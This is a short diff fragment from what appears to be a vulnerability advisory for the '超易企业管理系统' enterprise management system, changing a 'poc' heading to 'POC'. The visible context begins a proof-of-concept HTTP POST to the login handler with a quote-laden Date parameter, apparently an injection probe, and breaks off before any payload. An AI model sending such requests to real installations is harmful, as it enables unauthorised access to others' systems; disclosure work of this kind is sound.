@@ -8,7 +8,7 @@
 "超易企业管理系统"
 ```
 
-## poc
+## POC
 
 ```java
 POST /ajax/Login.ashx?Date=%271721821198459%27 HTTP/1.1
